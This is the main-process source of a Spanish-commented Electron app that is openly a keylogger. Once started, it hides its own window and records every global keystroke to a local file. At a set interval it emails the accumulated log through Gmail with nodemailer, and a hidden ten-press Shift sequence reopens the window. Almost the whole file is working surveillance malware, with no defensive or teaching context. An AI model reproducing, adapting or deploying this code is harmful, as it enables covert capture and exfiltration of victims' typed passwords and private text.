const { app, BrowserWindow, ipcMain} = require('electron');
const gkm = require('gkm');
const fs = require('fs');
const nodemailer = require('nodemailer');
  
// Mantén una referencia global del objeto window, si no lo haces, la ventana 
// se cerrará automáticamente cuando el objeto JavaScript sea eliminado por el recolector de basura.
  let win, mayus, key, time, contador = 0, window, email, password;
  
  ipcMain.on('sendEvery', (event, arg) => {
    time = arg * 60000;
  })

  ipcMain.on('startKeylogger', (event, arg) => {
    win.hide();
    window = false;
    email = arg.email;
    password = arg.password;
  });

  let createWindow = () => {
    // Crea la ventana del navegador.
    win = new BrowserWindow({ width: 800, height: 600 })
    // y carga el archivo index.html de la aplicación.
    win.loadFile('./src/views/index.html');
    win.on('hide', () => {
      if(!window){
        gkm.events.on('key.*', function(data) {
          if(this.event !== 'key.typed' && this.event !== 'key.pressed'){
            if(data[0].match(/^Bloqueo/)){
              if(!mayus){
                mayus = true;
              } else {
                mayus = false;
              }
            }
            if(mayus){
              key = data[0].toLowerCase();
            } else {
              key = data[0].toUpperCase();
            }
            if(key == 'LEFT SHIFT' || key == 'left shift'){
              contador++;
              if(contador === 10){
                win.show();
              }
            } else {
              contador = 0;
            }
            console.log(key);
            fs.appendFile('data.txt', `[${key}]`, 'utf8', (err) => {
              if(err) throw err;
            });
          }
        });
        setInterval(() => {
          let transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
              user: email,
              pass: password
            }
          });

          let dataTxt;
          fs.readFile('data.txt', async (err, content) => {
            if (err) throw err;
            dataTxt = await content.toString();
            let mailOptions = {
              from: email,
              to: email,
              subject: 'Keylogger data',
              text: dataTxt
            };
            
            transporter.sendMail(mailOptions, function(error, info){
              if (error) {
                console.log(error);
              } else {
                console.log('Email sent: ' + info.response);
              }
            });
          });

        }, time);
      }

      win.on('show', () => {
        window = true;
      });
  
    })
    // Abre las herramientas de desarrollo (DevTools).
    win.webContents.openDevTools()
  
    // Emitido cuando la ventana es cerrada.
    win.on('closed', () => {
      // Elimina la referencia al objeto window, normalmente  guardarías las ventanas
      // en un vector si tu aplicación soporta múltiples ventanas, este es el momento
      // en el que deberías borrar el elemento correspondiente.
      win = null
    });
  }
  
  // Este método será llamado cuando Electron haya terminado
  // la inicialización y esté listo para crear ventanas del navegador.
  // Algunas APIs pueden usarse sólo después de que este evento ocurra.
  app.on('ready', createWindow);
 
  // Sal cuando todas las ventanas hayan sido cerradas.
  app.on('window-all-closed', () => {
    // En macOS es común para las aplicaciones y sus barras de menú
    // que estén activas hasta que el usuario salga explicitamente con Cmd + Q
    if (process.platform !== 'darwin') {
      app.quit()
    }
  })
  
  app.on('activate', () => {
    // En macOS es común volver a crear una ventana en la aplicación cuando el
    // icono del dock es clicado y no hay otras ventanas abiertas.
    if (win === null) {
      createWindow()
    }
  })